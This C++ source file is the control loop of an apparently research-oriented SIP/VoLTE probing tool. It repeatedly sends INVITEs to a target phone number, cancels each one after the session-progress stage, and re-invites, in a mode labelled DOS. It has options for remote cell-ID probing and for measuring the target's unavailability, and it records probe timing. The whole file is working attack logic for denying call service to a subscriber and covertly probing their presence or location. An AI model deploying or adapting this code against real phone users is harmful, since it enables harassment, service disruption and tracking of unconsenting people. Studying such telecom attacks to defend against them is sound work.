#include "probe_controller.h"

#include <array>
#include <chrono>
#include <iostream>
#include <span>
#include <utility>
#include <vector>

#include "application.h"
#include "probe_loop_policy.h"
#include "session.h"
#include "sip.h"
#include "util.h"

void ProbeController::run(
    pollfd& pfd,
    int nReady,
    const std::string& calleeId) {
  std::array<SipMessage, 2> sips = {
      SipMessage(util::context.configFolder),
      SipMessage(util::context.configFolder)};
  session.currentSipApp = SipApp::DOS;
  auto&& [front, back] = sips;

  front.initialize(
      session.config.local,
      session.config.remote,
      util::context.callerId,
      calleeId,
      session.state.secver,
      session.state.accessNetwork,
      std::to_string(ntohs(session.state.srcPort) - 1));
  back.initialize(
      session.config.local,
      session.config.remote,
      util::context.callerId,
      calleeId,
      session.state.secver,
      session.state.accessNetwork,
      std::to_string(ntohs(session.state.srcPort) - 1));

  if (util::context.verbose) {
    std::cout << "Launch call dos to " << calleeId << std::endl;
  }
  application.prepareFreshInvite(front);
  application.armInviteTiming(front.invite);
  session.encapsulate(std::span<uint8_t>(
      reinterpret_cast<uint8_t*>(front.invite.data()), front.invite.size()));
  session.setSipState(SipState::INVITE, "initial probe INVITE sent");

  session.state.sessionProgressCount[calleeId] = 0;

  auto lastProbeTime = std::chrono::steady_clock::now();
  std::vector<double> probeIntervals;
  const auto minFreshInviteInterval =
      std::chrono::seconds(util::context.probeIntervalSeconds);
  auto watchedState = session.currentSipState;
  auto watchedStateAt = std::chrono::steady_clock::now();

  auto noteStateTransition = [&]() {
    if (session.currentSipState != watchedState) {
      watchedState = session.currentSipState;
      watchedStateAt = std::chrono::steady_clock::now();
    }
  };

  auto applyWatchdog = [&]() {
    const auto action = probe_loop_policy::evaluateWatchdog(
        session.currentSipState,
        std::chrono::steady_clock::now() - watchedStateAt);
    switch (action) {
      case probe_loop_policy::WatchdogAction::FORCE_FRESH_INVITE:
        if (session.currentSipState == SipState::INVITE) {
          if (util::context.verbose) {
            std::cout << "[watchdog] INVITE stuck >20s, forcing fresh INVITE"
                      << std::endl;
          }
          session.setSipState(SipState::BUSY, "watchdog: invite stuck");
        } else {
          if (util::context.verbose) {
            std::cout
                << "[watchdog] REQUESTERMINATE stuck >10s, forcing fresh INVITE"
                << std::endl;
          }
          session.setSipState(
              SipState::BUSY, "watchdog: request terminate stuck");
        }
        session.state.retryCancelPending = false;
        session.state.retryInvitePending = true;
        noteStateTransition();
        break;
      case probe_loop_policy::WatchdogAction::FORCE_CANCEL_RETRY:
        if (session.currentSipState == SipState::CANCEL) {
          if (util::context.verbose) {
            std::cout << "[watchdog] CANCEL stuck >10s, forcing retry path"
                      << std::endl;
          }
          session.setSipState(SipState::BUSY, "watchdog: cancel stuck");
        } else {
          if (util::context.verbose) {
            std::cout
                << "[watchdog] provisional flow stuck >20s, forcing cancel retry path"
                << std::endl;
          }
          session.setSipState(SipState::BUSY, "watchdog: provisional stuck");
        }
        session.state.retryCancelPending = true;
        session.state.retryInvitePending = false;
        noteStateTransition();
        break;
      case probe_loop_policy::WatchdogAction::NONE:
        break;
    }
  };

  auto freshInviteDelayRemaining = [&]() {
    if (!session.state.t_invite.has_value()) {
      return std::chrono::steady_clock::duration::zero();
    }
    const auto elapsed =
        std::chrono::steady_clock::now() - *session.state.t_invite;
    if (elapsed >= minFreshInviteInterval) {
      return std::chrono::steady_clock::duration::zero();
    }
    return minFreshInviteInterval - elapsed;
  };

  while (true) {
    if (!application.handleIncomingPackets(nReady)) {
      session.state.retryImmediate = true;
    }
    if (nReady == 0 && session.currentSipState == SipState::END) break;

    if (nReady == 0 &&
        session.currentSipState == SipState::REQUESTERMINATE &&
        session.state.retryInvitePending) {
      session.setSipState(SipState::BUSY, "terminate timeout fallback");
    }

    noteStateTransition();
    applyWatchdog();

    if (nReady >= 0) {
      if (session.state.retryImmediate) {
        session.state.retryImmediate = false;
        session.state.retryCancelPending = true;
        session.setSipState(SipState::BUSY, "retryImmediate requested");
      }

      switch (session.currentSipState) {
        case SipState::SPROG:
          if (util::context.verbose) {
            std::cout << calleeId << " call session has been occupied" << std::endl;
          }
          session.state.sessionProgressCount[session.state.calleeId]++;
          session.setSipState(SipState::PRACK, "session progress received");

          if (util::context.remoteCellIDProber) {
            session.currentSipApp = SipApp::DOS;
          }

          if (session.state.sessionProgressCount[session.state.calleeId] >=
                  session.state.maxSessionProgressOfCarrier ||
              util::context.unavailabilityEval) {
            session.state.sessionProgressCount[session.state.calleeId] = 0;

            if (util::context.verbose > 1) std::cout << "SEND CANCEL" << std::endl;
            session.encapsulate(std::span<uint8_t>(
                reinterpret_cast<uint8_t*>(front.cancel.data()),
                front.cancel.size()));
            session.state.retryCancelPending = false;
            session.state.retryInvitePending = true;
            session.setSipState(
                SipState::REQUESTERMINATE,
                "threshold reached, wait terminate before next INVITE");
          }
          break;
        case SipState::CANCEL:
          if (util::context.verbose > 1) std::cout << "SEND CANCEL" << std::endl;
          session.encapsulate(std::span<uint8_t>(
              reinterpret_cast<uint8_t*>(front.cancel.data()),
              front.cancel.size()));
          session.state.retryCancelPending = false;
          session.state.retryInvitePending = true;
          session.setSipState(
              SipState::REQUESTERMINATE,
              "cancel sent for normal termination");
          break;
        case SipState::BUSY:
          if (session.state.retryCancelPending) {
            if (util::context.verbose > 1) std::cout << "SEND CANCEL" << std::endl;
            session.encapsulate(std::span<uint8_t>(
                reinterpret_cast<uint8_t*>(front.cancel.data()),
                front.cancel.size()));
            session.state.retryCancelPending = false;
            session.state.retryInvitePending = true;
            session.setSipState(
                SipState::REQUESTERMINATE, "cancel sent for retry");
            break;
          }

          if (session.state.retryInvitePending) {
            const auto waitRemaining = freshInviteDelayRemaining();
            if (waitRemaining > std::chrono::steady_clock::duration::zero()) {
              if (util::context.verbose) {
                const auto waitMs =
                    std::chrono::duration_cast<std::chrono::milliseconds>(
                        waitRemaining)
                        .count();
                std::cout << "[rate-limit] fresh INVITE delayed " << waitMs
                          << "ms to avoid rapid retry/forwarding loop" << std::endl;
              }
              break;
            }
            if (util::context.verbose > 1) std::cout << "SEND INVITE" << std::endl;
            application.prepareFreshInvite(back);
            application.armInviteTiming(back.invite);
            session.encapsulate(std::span<uint8_t>(
                reinterpret_cast<uint8_t*>(back.invite.data()),
                back.invite.size()));
            session.setSipState(SipState::INVITE, "fresh INVITE sent for retry");

            front.setBranch();
            front.setCallId();
            front.setFromTag();
            std::swap(front, back);
          }
          break;
        case SipState::ACK: {
          std::cout << "SipState::ACK\n";
          const auto now = std::chrono::steady_clock::now();
          probeIntervals.push_back(static_cast<double>(
              std::chrono::duration_cast<std::chrono::milliseconds>(
                  now - lastProbeTime)
                  .count()));
          writeProbeTimeCDFToFile(probeIntervals, "probe_time_cdf.txt");
          lastProbeTime = now;
          session.setSipState(SipState::END, "ACK completed");
          break;
        }
        default:
          break;
      }
      noteStateTransition();
    }
    nReady = poll(&pfd, 1, 5000);
  }
  application.emitActiveAttemptFinished("probe_loop_ended");
}
